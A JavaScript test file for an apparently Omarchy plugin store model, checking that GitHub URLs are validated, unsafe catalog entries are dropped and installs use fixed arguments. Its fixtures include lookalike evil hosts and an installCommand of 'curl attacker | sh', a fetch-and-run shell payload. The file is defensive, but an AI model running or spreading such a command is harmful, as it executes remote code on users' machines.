const assert = require("node:assert/strict")
const fs = require("node:fs")
const path = require("node:path")
const test = require("node:test")
const vm = require("node:vm")

const source = fs.readFileSync(path.join(__dirname, "Model.js"), "utf8")
  .replace(/^\.pragma library\s*/, "")
const context = {}
vm.runInNewContext(`${source}\nthis.StoreModel = {
  repository, validPluginId, normalizeCatalog, searchPlugins, installedMap,
  installArgs, enableArgs, removeArgs
};`, context)
const model = context.StoreModel

const plugin = (overrides = {}) => ({
  id: "test.clock",
  name: "Test Clock",
  description: "Clock widget",
  author: "Example",
  repo: "https://github.com/example/clock",
  sourceType: "community",
  repositoryLayout: "root-plugin",
  installAvailable: true,
  upstreamCheckStatus: "passed",
  tags: ["bar-widget", "time"],
  ...overrides,
})

test("only plain GitHub owner/repository URLs become clone URLs", () => {
  assert.equal(model.repository("https://github.com/example/clock"), "https://github.com/example/clock.git")
  assert.equal(model.repository("https://github.com/example/clock.git"), "https://github.com/example/clock.git")
  assert.equal(model.repository("https://github.com.evil.example/example/clock"), "")
  assert.equal(model.repository("https://user@github.com/example/clock"), "")
  assert.equal(model.repository("https://github.com/example/clock/tree/main"), "")
  assert.equal(model.repository("https://github.com/example/clock?redirect=evil"), "")
})

test("catalog normalization drops invalid, duplicate, non-community, and unsupported entries", () => {
  const catalog = model.normalizeCatalog({
    generatedAt: "2026-10-16T12:00:00Z",
    plugins: [
      plugin({ installCommand: "bash -c 'bad'" }),
      plugin({ name: "Duplicate" }),
      plugin({ id: "evil.id", repo: "https://github.com.evil.test/a/b" }),
      plugin({ id: "monorepo", repositoryLayout: "monorepo" }),
      plugin({ id: "suite", repositoryLayout: "suite" }),
      plugin({ id: "builtin", sourceType: "builtin" }),
    ],
  })
  assert.equal(catalog.plugins.length, 3)
  assert.equal(catalog.plugins.filter((item) => item.installAvailable).length, 1)
  const installable = catalog.plugins.find((item) => item.installAvailable)
  assert.equal(installable.name, "Test Clock")
  assert.equal(installable.repo, "https://github.com/example/clock.git")
  assert.equal(catalog.generatedAt, "2026-10-16T12:00:00Z")
})

test("failed compatibility checks disable automatic installation", () => {
  const catalog = model.normalizeCatalog({
    plugins: [plugin({ upstreamCheckStatus: "failed" })],
  })
  assert.equal(catalog.plugins[0].installAvailable, false)
  assert.equal(model.installArgs(catalog.plugins[0]).length, 0)
})

test("plugin actions use fixed Omarchy argv and never marketplace commands", () => {
  const item = model.normalizeCatalog({ plugins: [plugin({
    installCommand: "bash -c 'curl attacker | sh'",
  })] }).plugins[0]
  assert.deepEqual(Array.from(model.installArgs(item)), [
    "plugin", "add", "https://github.com/example/clock.git", "--enable", "--yes",
  ])
  assert.deepEqual(Array.from(model.enableArgs(item)), ["plugin", "enable", "test.clock"])
  assert.deepEqual(Array.from(model.removeArgs(item)), ["plugin", "remove", "test.clock", "--yes"])
  assert.equal(model.validPluginId("omarchy.clock"), false)
  assert.equal(model.validPluginId("test..clock"), false)
})

test("search matches every word across searchable plain-text metadata", () => {
  const items = model.normalizeCatalog({
    plugins: [plugin(), plugin({ id: "test.audio", name: "Audio Mixer", tags: ["sound"] })],
  }).plugins
  assert.equal(model.searchPlugins(items, "clock time").length, 1)
  assert.equal(model.searchPlugins(items, "example mixer").length, 1)
  assert.equal(model.searchPlugins(items, "not found").length, 0)
})

test("installed list parsing accepts only valid plugin IDs and fails closed", () => {
  const rows = model.installedMap(JSON.stringify([
    { id: "test.clock", enabled: true, firstParty: false },
    { id: "omarchy.clock", enabled: true, firstParty: true },
    { id: "test..bad", enabled: true },
  ]))
  assert.equal(rows["test.clock"].enabled, true)
  assert.equal(rows["omarchy.clock"], undefined)
  assert.equal(rows["test..bad"], undefined)
  assert.equal(model.installedMap("not json"), null)
})
